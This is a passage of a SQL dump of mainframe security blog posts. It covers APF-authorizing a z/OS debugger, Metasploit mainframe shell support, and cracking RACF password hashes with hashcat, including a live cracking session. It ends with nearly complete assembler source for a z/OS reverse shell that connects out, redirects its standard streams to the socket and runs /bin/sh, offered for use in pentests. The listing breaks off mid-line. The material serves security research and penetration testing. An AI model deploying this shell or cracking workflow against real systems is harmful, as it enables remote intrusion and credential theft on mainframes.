the box” because I have had success in modifying one of the tools (HLASM Toolkit Debugger, aka IDF) to do the items listed above with any major restrictions (that I’ve found thus far).   For the TL;DR crowd, the modifications which allowed this to happen were this: (Disclaimer:  I’m assuming anyone doing this has the authority, permission and understands the potential security repercussions of doing so.  If not, please stop and find someone who does).\n\nAPF authorize a copy of, or the library from which, the ASMIDF tool runs.\nLink edit the ASMIDF load module AC=1\nAdd ASMIDF to the TSO authorized commands / programs list ( I didn’t test to see if one or the other was sufficient, just did both ).\nTest with a simple program that uses some privileged commands and Macros.\n\nFor the rest of you who, like me, needed to understand a bit more on what each of these steps entail, read on.    Also, in full disclosure, I came across this idea via a Google search on the topic which yielded 2 hits of people who said they’d tried and mostly succeed at this method.  Though, in true MVS form, neither explained how to do so.   I’ll break each step down, with some examples here.\nAPF authorize a copy of the IDF library.\nI used a copy of the library, just to be safe, then dynamically authorized it and added it to my link list concatenation.  Here’s a simple JCL to copy the library (you’ll have to fill in your own HLQ’s and library names as appropriate):\r\n\r\n		\r\n		\r\n			\r\n			Assembly (x86)\r\n			\r\n			\n//MYJOB JOB (GUY),\'iebcopy ds\',\r\n//   NOTIFY=&amp;SYSUID,\r\n//   MSGCLASS=H,\r\n//   MSGLEVEL=(1,1)\r\n//*\r\n//*  IEBCOPY members from one DS to another\r\n//*\r\n//STEP1   EXEC PGM=IEBCOPY\r\n//SYSUT1  DD  DSN=HLQ.ASMLIB.SRC,DISP=SHR          /* INPUT DS  */\r\n//SYSUT2  DD  DSN=HLQ.ASMLIB.NEW,DISP=(NEW,CATLG), /* OUTPUT DS */\r\n//        SPACE=(TRK,(80,50,20)),UNIT=SYSALLDA,\r\n//        BLKSIZE=6144,VOL=SER=TEMP1,\r\n//        RECFM=U,DSNTYPE=PDS,LRECL=0\r\n//SYSPRINT  DD  SYSOUT=A\r\n			\r\n				\r\n					\r\n				\r\n					1234567891011121314\r\n				\r\n						//MYJOB JOB (GUY),\'iebcopy ds\',//   NOTIFY=&amp;SYSUID,//   MSGCLASS=H,//   MSGLEVEL=(1,1)//*//*  IEBCOPY members from one DS to another//*//STEP1   EXEC PGM=IEBCOPY//SYSUT1  DD  DSN=HLQ.ASMLIB.SRC,DISP=SHR          /* INPUT DS  *///SYSUT2  DD  DSN=HLQ.ASMLIB.NEW,DISP=(NEW,CATLG), /* OUTPUT DS *///        SPACE=(TRK,(80,50,20)),UNIT=SYSALLDA,//        BLKSIZE=6144,VOL=SER=TEMP1,//        RECFM=U,DSNTYPE=PDS,LRECL=0//SYSPRINT  DD  SYSOUT=A\r\n					\r\n				\r\n			\r\n		\r\n\r\nThe following commands (issued from a console or SDSF) will apf authorize the library.\r\n\r\n		\r\n		\r\n			\r\n			Assembly (x86)\r\n			\r\n			\nSETPROG APF,ADD,DSNAME=HLQ.ASMLIB.NEW\r\n			\r\n				\r\n					\r\n				\r\n					1\r\n				\r\n						SETPROG APF,ADD,DSNAME=HLQ.ASMLIB.NEW\r\n					\r\n				\r\n			\r\n		\r\n\r\n\nLink edit the copy of ASMIDF AC=1\nThis apf authorizes the load module itself.  (You can verify this by looking at the file, once this has run in ISPF.  You should see 01 in the AC column.\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\n//MYJOB JOB (GUY),\'setcode\',\r\n//   NOTIFY=&SYSUID,\r\n//   MSGCLASS=H,\r\n//   MSGLEVEL=(1,1)\r\n//*\r\n//*\r\n//*\r\n//SETCODE   EXEC PGM=HEWL\r\n//SYSPRINT  DD  SYSOUT=A\r\n//SYSUT1    DD  UNIT=SYSALLDA,SPACE=(TRK,(10,5))\r\n//SYSLMOD   DD  DSN=HLQ,ASMLIB.NEW,DISP=SHR\r\n//SYSLIN    DD  DSN=HLQ.ASMLIB.NEW(ASMIDF),DISP=(SHR,PASS),\r\n//          UNIT=SYSDA\r\n//          DD  *\r\n        SETCODE    AC(1)\r\n        ENTRY      ASMMAIN\r\n        NAME       ASMIDF(R)\r\n/*\r\n//*\r\n			\r\n				\r\n					\r\n				\r\n					12345678910111213141516171819\r\n				\r\n						//MYJOB JOB (GUY),\'setcode\',//   NOTIFY=&SYSUID,//   MSGCLASS=H,//   MSGLEVEL=(1,1)//*//*//*//SETCODE   EXEC PGM=HEWL//SYSPRINT  DD  SYSOUT=A//SYSUT1    DD  UNIT=SYSALLDA,SPACE=(TRK,(10,5))//SYSLMOD   DD  DSN=HLQ,ASMLIB.NEW,DISP=SHR//SYSLIN    DD  DSN=HLQ.ASMLIB.NEW(ASMIDF),DISP=(SHR,PASS),//          UNIT=SYSDA//          DD  *        SETCODE    AC(1)        ENTRY      ASMMAIN        NAME       ASMIDF(R)/*//*\r\n					\r\n				\r\n			\r\n		\r\n\r\n\nAdd the new library to your link list, remove the old one\nThis ensures you won’t run into issues using the old one (assuming you log out, back in before trying ASMIDF when you’re done with this procedure).\r\n\r\n		\r\n		\r\n			\r\n			Assembly (x86)\r\n			\r\n			\nD PROG,LNKLST #get old lnklst name e.g. LNKLST00\r\n\r\nSETPROG LNKLST,DEFINE,NAME=TESTLL,COPYFROM=LNKLST00\r\n\r\nSETPROG LNKLST,DELETE,NAME=TESTLL,DSNAME=HLQ.ASMLIB.SRC \r\n\r\nSETPROG LNKLST,ADD,NAME=TESTLL,DSNAME=HLQ.ASMLIB.NEW,ATTOP\r\n\r\nSETPROG LNKLST,ACTIVATE,NAME=TESTLL\r\n			\r\n				\r\n					\r\n				\r\n					123456789\r\n				\r\n						D PROG,LNKLST #get old lnklst name e.g. LNKLST00 SETPROG LNKLST,DEFINE,NAME=TESTLL,COPYFROM=LNKLST00 SETPROG LNKLST,DELETE,NAME=TESTLL,DSNAME=HLQ.ASMLIB.SRC  SETPROG LNKLST,ADD,NAME=TESTLL,DSNAME=HLQ.ASMLIB.NEW,ATTOP SETPROG LNKLST,ACTIVATE,NAME=TESTLL\r\n					\r\n				\r\n			\r\n		\r\n\r\n\nAdd ASMIDF to the TSO/E authorized cmd and pgm lists.\n\r\n\r\n		\r\n		\r\n			\r\n			Assembly (x86)\r\n			\r\n			\nD IKJTSO # capture the name of the parmlib member e.g. IKJTSO55\r\n\r\n[ need to make a copy of that member in the parmlib, IKJTSO99 ]\r\n[ edit the IKJTSO99 member to add ASMIDF to the following sections ]\r\n\r\n AUTHCMD NAMES(       +   \r\n    ASMIDF            +      <-add this line    \r\n    AD       ADDSD    +   \r\n-----------------------------\r\n AUTHPGM NAMES(      + \r\n    ASMIDF           +       <-and this one\r\n    ICHUT100         + \r\n\r\n[ then back to the console to set the new member active ]\r\nSET IKJTSO=99\r\n			\r\n				\r\n					\r\n				\r\n					123456789101112131415\r\n				\r\n						D IKJTSO # capture the name of the parmlib member e.g. IKJTSO55 [ need to make a copy of that member in the parmlib, IKJTSO99 ][ edit the IKJTSO99 member to add ASMIDF to the following sections ]  AUTHCMD NAMES(       +       ASMIDF            +      <-add this line        AD       ADDSD    +   ----------------------------- AUTHPGM NAMES(      +     ASMIDF           +       <-and this one    ICHUT100         +  [ then back to the console to set the new member active ]SET IKJTSO=99\r\n					\r\n				\r\n			\r\n		\r\n\r\nAll of the steps, except the initial copy/link edit, will not survive an IPL. To do that, you need to edit your PROGXX and possibly IEASYSXX parmlib members and add / remove the corresponding libraries accordingly.\nThe tools and their issues:\n\nOMVS/USS dbx\n\nDespite making all of the RACF profile and authorization changes suggested in the manuals, and trying a multitude of users / programs and methods, I could not get dbx to debug an apf authorized program.   The manual quote is below:\n\n\n\n\r\n\r\n		\r\n		\r\n			\n.... enables you to debug APF-authorized programs, using ptrace\r\n			\r\n				\r\n					\r\n				\r\n					1\r\n				\r\n						.... enables you to debug APF-authorized programs, using ptrace\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n\n\n\n\nDebug Tool for z/OS\n\nThe most festively-colored of the bunch, and able to debug apf authorized programs, this tool chokes on any of the linkage stack commands (BAKR, for example) and anything that uses the AR ASC mode.  From the manual:\n\n\n\n\r\n\r\n		\r\n		\r\n			\nDebugging of programs that use Access Register mode is not supported.\r\nYou cannot debug programs that do not use standard linkage conventions\r\nfor registers 13, 14, and 15 or that use the Linkage Stack.\r\n			\r\n				\r\n					\r\n				\r\n					123\r\n				\r\n						Debugging of programs that use Access Register mode is not supported.You cannot debug programs that do not use standard linkage conventionsfor registers 13, 14, and 15 or that use the Linkage Stack.\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n\n\n\n\nTSO/E test and testauth commands\n\nThe grandaddy of them all has a great deal of functionality, will execute authorized programs and commands, but doesn’t fit the rest of the bill.  Frankly, even if it did, it would be a pretty tedious task to do any significant quantity of debugging in this tool.  But hey,  who wouldn’t want to live in this all day long:\n\n\n\nBefore the cantankerous crew chastises me about how much code they ran through back in the day using only TSO/E test and a slide rule, let me just say this:I love text based interfaces.   I generally prefer the likes of gdb/windbg to one of the gui based programs for many items (not all, but many) because it’s faster, scriptable and generally more powerful in many occasions.  However, there is value in much of the progress that’s been made in this area – going backward for nostalgia’s sake is one thing, but eschewing technological progress for it’s own sake is quite another.\n\n\nASMIDF (so far so good)\n\n\n\n\n\nHope you enjoyed the post – and, if you’re still reading this and going to SHARE in the spring, I’ll see you there!\n\nFootnotes:\n** (Note for the rest of this article I’m going to just use the term debug to mean debugging and disassembly – I realize there are significant differences in these terms, but for my purposes I need a tool which does both.\n* Notably absent is Hexray’s Ida Pro, considered the gold-standard by many, this is so richly-featured to really be in a league of it’s own.', 'Exploit Development, Mainframe, Reverse Engineering, Security', 'https://www.bigendiansmalls.com/a-mostly-useful-debugger-on-zos/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (30, 'Mainframe Insecuritites or Hack the Gibson. No, Really!', 'bigendiansmalls', '', 'Mainframe Insecuritites or Hack the Gibson. No, Really!', 'Exploit Development, Mainframe, Security', 'https://www.bigendiansmalls.com/mainframe-insecuritites-or-hack-the-gibson-no-really/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (31, 'Mainframe Shell – Metasploit Framework', 'bigendiansmalls', '2015-10-27T08:18:33+00:00', 'The public metasploit-framework now (officially) has the basic underpinnings for beginning mainframe pentesting.\nAs of 10/25 – there is now a shell which, along with the some core architecture files implemented a while back, will let non-EBCDIC based machines running the Metasploit Framework communicate with processes on the mainframe, doing the ASCII<->EBCDIC conversions under the covers.\nWhat can you do with it?  Nothing.  Yet.  The next steps are payloads, then exploits.   The payloads are in the bank, written and being tested against a couple different versions of Z/OS (1.12, 1.13, 2.1 for now).  Those should show up in the framework soon.   Once there, they provide the last basic requirement for exploit development (generally rewarded with some type of shell).\nOther items in various stages of development (TN3270 work done in collaboration with and much coding from @mainframed767) :\r\n\r\n		\r\n		\r\n			\r\n			\r\n				\r\n					\r\n				\r\n					123456\r\n				\r\n						- Direct command execution- Binary/Text file transfer (outside of TN3270)- TN3270 interactions    + Screen interaction with TSO\\ISPF    + IND$FILE transfers- A specialized Meterpreter ??', 'Exploit Development, Mainframe, Security, Tips', 'https://www.bigendiansmalls.com/mainframe-shell-metasploit-framework/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (32, 'RACF gets serious about password encryption.', 'bigendiansmalls', '2015-10-12T19:41:12+00:00', 'TL;DR ->Earlier this year IBM updated (and made backwards compatible to z/os v1r12) their RACF password hashing/encryption technology – and it’s awesome.  The APAR OA43999 has been out for months and, after you research and test it, you should apply it then migrate your users to the stronger algorithm as soon as you can.   This increases the complexity of brute forcing RACF passwords from hours/days to months/years!  Want more info/background?  Read on….\n\nRACF, IBM’s ESM (external security manager) uses an outdated and insecure password hashing/encryption algorithm.   Their implementation of DES to encrypt and protect the user’s password is trivially easy to compromise with simple hardware.\nThe [old] rules and implementation of passwords on the mainframe have been the topic of much discussion and teeth gnashing.   While RACF supported passphrases and mixedcase passwords (as opposed to the maximum 8 character, case insensitive previous default) back in 2005; the TSO component did not until a few years later.  And, even then, companies were slow to adopt because the change was difficult to reverse and in-house/3rd party developed programs may have relied on the original restrictions.\nThe RACF DES algorithm, implementation, and location of hashes in the RACF database on the system are well known and common tools (like John the Ripper ) support converting and cracking them offline with ease.  OclHashcat also has support for brute forcing RACF DES passwords; thus adding the advantages of GPU brute forcing to the mix.\nEnter APAR OA43999.  Here (IBM’s original statement of direction for RACF) and here:  Taking the sword out of password <- a presentation of what comes with the update.   There are a great deal of cool features in this APAR.   The main one I want to focus on is the KDFAES password hashing and profile encryption algorithm.\nA KDF (Key Derivation Function) is a way to take a password, bolt on some random data (to prevent the use of rainbow tables), hash it with a common algorithm (here SHA256) 1000s of times to ultimately generate a byte sequence of a predetermined length, which can then be used as the key for a solid symmetric crypto algrithm (in this APAR, they are using AES) which then encrypts the users profile.\nIBM chose (from what I gather in the APAR doco) to implement PBKDF2-SHA256.   PBKDF2 can be tailored to both use a tremendous number of iterations of hashing the password as well as forced to use a large amount of main memory to do so.  Arbitrarily using large amounts of memory can help slow down offline brute-force attacks.\nHow does this help prevent password brute forcing?   Password cracking is a trivially easy process to parallelize.   It works like this: potential password plain texts are run through the same DES-based algorithm used to encrypt the passwords on the mainframe, then compared to the offline RACF database.  The PBKDF2 algorithm slows down the brute forcing process exponentially.\nIt’s not at all uncommon to have a machine, relatively inexpensive to build with off-the-shelf (think Amazon, Newegg, Bestbuy) parts and yield  billions of guesses per second (for something like MD5) or 100s of millions for RACF/DES.\r\n\r\n		\r\n		\r\n			Two quick tests\r\n			Shell\r\n			\r\n			\nDevice #1: GeForce GTX 550 Ti, 1023MB, 1800Mhz, 4MCU\r\n\r\nHashtype: MD5\r\nWorkload: 1024 loops, 256 accel\r\n\r\nSpeed.GPU.#1.:  1128.4 MH/s\r\n\r\n****************************************************\r\nDevice #1: GeForce GTX 550 Ti, 1023MB, 1800Mhz, 4MCU\r\n\r\nHashtype: RACF\r\nWorkload: 1024 loops, 256 accel\r\n\r\nSpeed.GPU.#1.:   131.0 MH/s\r\n\r\n****************************************************\r\nDevice #1: GeForce GTX 550 Ti, 1023MB, 1800Mhz, 4MCU\r\n\r\nHashtype: (PBKDF2-SHA256)\r\nWorkload: 1024 loops, 8 accel\r\n\r\nSpeed.GPU.#1.:     2856 H/s\r\n			\r\n				\r\n					\r\n				\r\n					12345678910111213141516171819202122\r\n				\r\n						Device #1: GeForce GTX 550 Ti, 1023MB, 1800Mhz, 4MCU Hashtype: MD5Workload: 1024 loops, 256 accel Speed.GPU.#1.:  1128.4 MH/s ****************************************************Device #1: GeForce GTX 550 Ti, 1023MB, 1800Mhz, 4MCU Hashtype: RACFWorkload: 1024 loops, 256 accel Speed.GPU.#1.:   131.0 MH/s ****************************************************Device #1: GeForce GTX 550 Ti, 1023MB, 1800Mhz, 4MCU Hashtype: (PBKDF2-SHA256)Workload: 1024 loops, 8 accel Speed.GPU.#1.:     2856 H/s\r\n					\r\n				\r\n			\r\n		\r\n\r\nHowever, the hashing function most similar to what IBM is describing would be at the bottom of the above test (PBKDF2-SH256) – notice it yields a paltry ~2.8k guesses per second compared to RACF/DES’s 131million/second.   Those results were from a very modest rig that I own which has 1 smallish GPU.   Better results are possible with slightly larger hardware, but the rates will still be an order of magnitude smaller than what’s possible for DES.\nNet is – this is a great move.  If someone was able to get a copy of your RACF database prior to this APAR, with the traditional RACF DES (middle test above about 100Mh/s on my box) 8 char maximum, case-insensitive alpha, digits, and only 3 special chars ($#@) – they could run the entire keyspace in a about 10 days max (much much faster on a box with bigger/faster GPUs).\r\n\r\n		\r\n		\r\n			\r\n			Shell\r\n			\r\n			\nSession.Name...: cudaHashcat\r\nStatus.........: Running\r\nInput.Mode.....: Mask (?1?1?1?1?1?1?1?1) [8]\r\nHash.Target....: File (./racf.text)\r\nHash.Type......: RACF\r\nTime.Started...: Sun Oct 11 23:49:41 2015 (5 secs)\r\nTime.Estimated.: Fri Oct 23 15:11:09 2015 (11 days, 15 hours)\r\nSpeed.GPU.#1...:   122.4 MH/s\r\nRecovered......: 17/40 (42.50%) Digests, 17/40 (42.50%) Salts\r\nProgress.......: 692060160/123096212991063 (0.00%)\r\nRejected.......: 0/692060160 (0.00%)\r\nRestore.Point..: 0/90224199 (0.00%)\r\nHWMon.GPU.#1...: -1% Util, 46c Temp, 41% Fan\r\n			\r\n				\r\n					\r\n				\r\n					12345678910111213\r\n				\r\n						Session.Name...: cudaHashcatStatus.........: RunningInput.Mode.....: Mask (?1?1?1?1?1?1?1?1) [8]Hash.Target....: File (./racf.text)Hash.Type......: RACFTime.Started...: Sun Oct 11 23:49:41 2015 (5 secs)Time.Estimated.: Fri Oct 23 15:11:09 2015 (11 days, 15 hours)Speed.GPU.#1...:   122.4 MH/sRecovered......: 17/40 (42.50%) Digests, 17/40 (42.50%) SaltsProgress.......: 692060160/123096212991063 (0.00%)Rejected.......: 0/692060160 (0.00%)Restore.Point..: 0/90224199 (0.00%)HWMon.GPU.#1...: -1% Util, 46c Temp, 41% Fan\r\n					\r\n				\r\n			\r\n		\r\n\r\nAfter the PTF (and especially if you broaden your keyspace to passphrase size or even mixed chars with the additional symbols) we’re now talking years (many many years) to crack them.   The one caveat is that assumes people do not use passwords that are easy to guess (like dictionary words) or compute (such as common words with an 01 added to the end).\nThe APAR provides for backwards compatibility with DES to allow a deliberate roll-out (existing users can use DES until they change their passwords).    A good deal all around.\nSome fun light reading:\nHistory of RACF\n \n[EDIT 10/13 – thank you to @solardiz for pointing out my descrypt comparison was wrong – updated to reflect RACF (which is brute forced much faster than descrypt)', 'Mainframe, Security', 'https://www.bigendiansmalls.com/racf-gets-serious-about-password-encryption/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (33, 'Mainframe Security Derbycon Slides and Video', 'bigendiansmalls', '2015-09-28T08:50:01+00:00', 'Here are the slides to my Derbycon talk on mainframe security.\n \n Mainframe Hacking – Derbycon 5.0 \n\n\n Mainframe Hacking Video – Derbycon 5.0', 'Mainframe, Security', 'https://www.bigendiansmalls.com/mainframe-security-derbycon-slides-and-video/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (34, 'The reverse shell', 'bigendiansmalls', '2015-09-24T09:38:28+00:00', 'A much slimmer and simpler complement to the bind shell.  Come see my talk at Derbycon this Saturday 5:30pm at  and learn about how you (yes you) can put this to use in your pentests!\nThis version does not have a built-in EBCDIC encoder/decoder like the bind shell below.   The client (or framework??) is responsible for character translation.\r\n\r\n		\r\n		\r\n			Reverse shell SystemZ w/o Encoder\r\n			Assembly (x86)\r\n			\r\n			\n         TITLE  \'non-encoding rev shell for systemz\'\r\nRSHLNT   CSECT\r\nRSHLNT   AMODE 31\r\nRSHLNT   RMODE ANY\r\n***********************************************************************\r\n@SETUP   DS    0F              # full word boundary\r\n         STM   14,12,12(13)    # save our registers\r\n         LARL  15,@SETUP       # base address into R15\r\n         LR    8,15            # copy R15 to R8\r\n         USING @SETUP,8        # R8 for addressability throughout\r\n         LARL  11,SAVEAREA     # sa address\r\n         ST    13,4(,11)       # save callers save area\r\n         LR    13,11           # R13 to our save area\r\n         DS    0H              # halfword boundaries\r\n\r\n***********************************************************************\r\n@LOADFS  L     2,FFUNC         # first function we use\r\n         LHI   3,8             # used for our index\r\n         L     4,NUMFUNC       # number of functions to load\r\n@LDLOOP  LR    0,2             # load string of func name\r\n         XR    1,1             # clear R1\r\n         SVC   8               # perform LOAD\r\n         XC    0(8,2),0(2)     # clear current Func space\r\n         ST    0,0(0,2)        # store addr in func space\r\n         AR    2,3             # increment R2 by 8\r\n         AHI   4,-1            # decrement R4\r\n         CIB   4,0,2,@LDLOOP   # compare R4 with 0,if GT loop\r\n\r\n***********************************************************************\r\nLSOCK    L     15,BSOC         # load func addr to 15\r\n         CALL  (15),(DOM,TYPE,PROTO,DIM,CLIFD,                         x\r\n               RTN_VAL,RTN_COD,RSN_COD),VL\r\n*******************************\r\n         LHI   15,2\r\n         L     6,RTN_VAL\r\n         CIB   6,0,7,EXITP     # R6 not 0? Time to exit\r\n\r\n***********************************************************************\r\nLCONN    L     15,BCON                      # load func addr to 15\r\n         LA    5,SRVSKT                     # addr of our socket\r\n         USING SOCKADDR,5                   # layout sockaddr over R5\r\n         XC    SOCKADDR(16),SOCKADDR        # zero sock addr struct\r\n         MVI   SOCK_FAMILY,AF_INET          # family inet\r\n         MVI   SOCK_LEN,SOCK#LEN            # len of socket\r\n         MVC   SOCK_SIN_PORT,CONNSOCK       # port to connect to\r\n         MVC   SOCK_SIN_ADDR,CONNADDR       # address to connect to\r\n         DROP  5\r\n         CALL  (15),(CLIFD,SOCKLEN,SRVSKT,                             x\r\n               RTN_VAL,RTN_COD,RSN_COD),VL\r\n*******************************\r\n         LHI   15,3\r\n         L     6,RTN_VAL\r\n         CIB   6,0,7,EXITP     # R6 not 0? Time to exit\r\n\r\n*************************************************\r\n         LA    2,F_DUPFD2      # gonna do a dup2\r\n         L     5,CLIFD         # set clifd=stdin\r\n         XR    6,6             # zero out R6 (stdin)\r\n         BRAS  14,LFCNTL       # call dupe2\r\n         LA    2,F_DUPFD2      # gonna do a dup2\r\n         L     5,CLIFD         # set clifd=stdin\r\n         LHI   6,1             # R6=stdout\r\n         BRAS  14,LFCNTL       # call dupe2\r\n         L     5,CLIFD         # set clifd=stdin\r\n         LHI   6,2             # R6=stderr\r\n         BRAS  14,LFCNTL       # call dupe2\r\n\r\n***********************************************************************\r\nLEXEC    L     15,BEXC         # load func addr to 15\r\n         CALL  (15),(EXCMDL,EXCMD,EXARGC,EXARGLL,EXARGL,               x\r\n               EXENVC,EXENVLL,EXENVL,                                  x\r\n               EXITRA,EXITPLA,                                         x\r\n               RTN_VAL,RTN_COD,RSN_COD),VL\r\n         BRAS  0,GOODEX        # exit child proc after exec\r\n\r\n***********************************************************************\r\nLFCNTL   L     15,BFCT         # load func addr to 15\r\n         ST    14,SAVEAREA     # save return address\r\n         ST    5,@FFD          # fd to be duplicated\r\n         ST    2,@ACT          # action field for BPX1FCT\r\n         ST    6,@ARG          # r6 should have the biggest fd\r\n         BRAS  0,@FCTL\r\n@FFD     DC    F\'0\'\r\n@ACT     DC    F\'0\'\r\n@ARG     DC    F\'0\'\r\n@RETFD   DC    F\'0\'\r\n@FCTL    CALL  (15),(@FFD,@ACT,@ARG,@RETFD,RTN_COD,RSN_COD),VL\r\n****************************************************\r\n         LHI   15,11           # exit code for this func\r\n         L     7,@RETFD        # set r6 to rtn val\r\n         CIB   7,-1,8,EXITP    # r6 = -1 exit\r\n         L     14,SAVEAREA     # reload ret address\r\n         BCR   15,14           # return to caller\r\n\r\n****************************************************\r\nGOODEX   XR    15,15           # zero return code\r\nEXITP    ST    15,0(,11)\r\n         L     13,4(,11)\r\n         LM    14,12,12(13)    # restore registers\r\n         LARL  5,SAVEAREA\r\n         L     15,0(0,5)\r\n         BCR   15,14           # branch to caller\r\n\r\n**********************\r\n@CONST   DS    0F              # constants full word boundary\r\nSAVEAREA DC    X\'00000000\'\r\n         DC    X\'00000000\'\r\nALET     DC    F\'0\'\r\n*************************\r\nFFUNC    DC    A(BSOC)          # address of first function\r\nNUMFUNC  DC    F\'5\'             # number of funcs listed below\r\nBSOC     DC    CL8\'BPX1SOC \'    # Socket\r\nBBND     DC    CL8\'BPX1BND \'    # Bind\r\nBCON     DC    CL8\'BPX1CON \'    # Connect\r\nBFCT     DC    CL8\'BPX1FCT \'    # Fcntl\r\nBEXC     DC    CL8\'BPX1EXC \'    # Exec\r\n*************************\r\nCONNSOCK DC    XL2\'3039\'          # port 12345\r\nCONNADDR DC    XL4\'00000000\'      # address 0.0.0.0\r\nBACKLOG  DC    F\'1\'               # 1 byte backlog\r\nDOM      DC    A(AF_INET)         # AF_INET = 2\r\nTYPE     DC    A(SOCK#_STREAM)    # stream = 1\r\nPROTO    DC    A(IPPROTO_IP)      # ip = 0\r\nDIM      DC    A(SOCK#DIM_SOCKET) # dim_sock = 1\r\nSRVSKT   DC    16XL1\'77\'          # srv socket struct\r\nSOCKLEN  DC    A(SOCK#LEN+SOCK_SIN#LEN)\r\nCLILEN   DC    A(*)               # len of client struct\r\nCLISKT   DC    16XL1\'88\'          # client socket struct\r\nCLIFD    DC    A(*)               # client fd\r\n************************\r\nEXCMD    DC    CL7\'/bin/sh\'       # command to exec\r\nEXCMDL   DC    A(L\'EXCMD)         # len of cmd to exec\r\nEXARGC   DC    F\'1\'               # num of arguments\r\nEXARG1   DC    CL2\'sh\'            # arg 1 to exec\r\nEXARG1L  DC    A(L\'EXARG1)        # len of arg1\r\nEXARGL   DC    A(EXARG1)          # addr of argument list\r\nEXARGLL  DC    A(EXARG1L)         # addr of arg len list\r\nEXENVC   DC    F\'0\'               # env var count\r\nEXENVL   DC    F\'0\'               # env var arg list addr\r\nEXENVLL  DC    F\'0\'               # env var arg len addr\r\nEXITRA   DC    F\'0\'               # exit routine addr\r\nEXITPLA  DC    F\'0\'               # exit rout parm list addr\r\n*********************\r\nRTN_VAL  DC    A(*)               # return value\r\nRTN_COD  DC    A(*)               # return code\r\nRSN_COD  DC    A(*)               # reason code\r\n***************************\r\n         BPXYSOCK   LIST=YES         # MACRO MAP for socket structure\r\n         BPXYFCTL   LIST=YES         # MACRO MAP for fcntl structure\r\n         END   @SETUP\r\n			\r\n				\r\n					\r\n				\r\n					123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150\r\n				\r\n						         TITLE  \'non-encoding rev shell for systemz\'RSHLNT   CSECTRSHLNT   AMODE 31RSHLNT   RMODE ANY***********************************************************************@SETUP   DS    0F              # full word boundary         STM   14,12,12(13)    # save our registers         LARL  15,@SETUP       # base address into R15         LR    8,15            # copy R15 to R8         USING @SETUP,8        # R8 for addressability throughout         LARL  11,SAVEAREA     # sa address         ST    13,4(,11)       # save callers save area         LR    13,11           # R13 to our save area         DS    0H              # halfword boundaries ***********************************************************************@LOADFS  L     2,FFUNC         # first function we use         LHI   3,8             # used for our index         L     4,NUMFUNC       # number of functions to load@LDLOOP  LR    0,2             # load string of func name         XR    1,1             # clear R1         SVC   8               # perform LOAD         XC    0(8,2),0(2)     # clear current Func space         ST    0,0(0,2)        # store addr in func space         AR    2,3             # increment R2 by 8         AHI   4,-1            # decrement R4         CIB   4,0,2,@LDLOOP   # compare R4 with 0,if GT loop ***********************************************************************LSOCK    L     15,BSOC         # load func addr to 15         CALL  (15),(DOM,TYPE,PROTO,DIM,CLIFD,                         x               RTN_VAL,RTN_COD,RSN_COD),VL*******************************         LHI   15,2         L     6,RTN_VAL         CIB   6,0,7,EXITP     # R6 not 0? Time to exit ***********************************************************************LCONN    L     15,BCON                      # load func addr to 15         LA    5,SRVSKT                     # addr of our socket         USING SOCKADDR,5                   # layout sockaddr over R5         XC    SOCKADDR(16),SOCKADDR        # zero sock addr struct         MVI   SOCK_FAMILY,AF_INET          # family inet         MVI   SOCK_LEN,SOCK#LEN            # len of socket         MVC   SOCK_SIN_PORT,CONNSOCK       # port to connect to         MVC   SOCK_SIN_ADDR,CONNADDR       # address to connect to         DROP  5         CALL  (15),(CLIFD,SOCKLEN,SRVSKT,                             x               RTN_VAL,RTN_COD,RSN_COD),VL*******************************         LHI   15,3         L     6,RTN_VAL         CIB   6,0,7,EXITP     # R6 not 0? Time to exit *************************************************         LA    2,F_DUPFD2      # gonna do a dup2         L     5,CLIFD         # set clifd=stdin         XR    6,6             # zero out R6 (stdin)         BRAS  14,LFCNTL       # call dupe2         LA    2,F_DUPFD2      # gonna do a dup2         L     5,CLIFD         # set clifd=stdin         LHI   6,1             # R6=stdout         BRAS  14,LFCNTL       # call dupe2         L     5,CLIFD         # set clifd=stdin         LHI   6,2             # R6=stderr         BRAS  14,LFCNTL       # call dupe2 ***********************************************************************LEXEC    L     15,BEXC         # load func addr to 15         CALL  (15),(EXCMDL,EXCMD,EXARGC,EXARGLL,EXARGL,               x               EXENVC,EXENVLL,EXENVL,                                  x               EXITRA,EXITPLA,                                         x               RTN_VAL,RTN_COD,RSN_COD),VL         BRAS  0,GOODEX        # exit child proc after exec ***********************************************************************LFCNTL   L     15,BFCT         # load func addr to 15         ST    14,SAVEAREA     # save return address         ST    5,@FFD          # fd to be duplicated         ST    2,@ACT          # action field for BPX1FCT         ST    6,@ARG          # r6 should have the biggest fd         BRAS  0,@FCTL@FFD     DC    F\'0\'@ACT     DC    F\'0\'@ARG     DC    F\'0\'@RETFD   DC    F\'0\'@FCTL    CALL  (15),(@FFD,@ACT,@ARG,@RETFD,RTN_COD,RSN_COD),VL****************************************************         LHI   15,11           # exit code for this func         L     7,@RETFD        # set r6 to rtn val         CIB   7,-1,8,EXITP    # r6 = -1 exit         L     14,SAVEAREA     # reload ret address         BCR   15,14           # return to caller ****************************************************GOODEX   XR    15,15           # zero return codeEXITP    ST    15,0(,11)         L     13,4(,11)         LM    14,12,12(13)    # restore registers         LARL  5,SAVEAREA         L     15,0(0,5)         BCR   15,14           # branch to caller **********************@CONST   DS    0F              # constants full word boundarySAVEAREA DC    X\'00000000\'         DC    X\'00000000\'ALET     DC    F\'0\'*************************FFUNC    DC    A(BSOC)          # address of first functionNUMFUNC  DC    F\'5\'             # number of funcs listed belowBSOC     DC    CL8\'BPX1SOC \'    # SocketBBND     DC    CL8\'BPX1BND \'    # BindBCON     DC    CL8\'BPX1CON \'    # ConnectBFCT     DC    CL8\'BPX1FCT \'    # FcntlBEXC     DC    CL8\'BPX1EXC \'    # Exec*************************CONNSOCK DC    XL2\'3039\'          # port 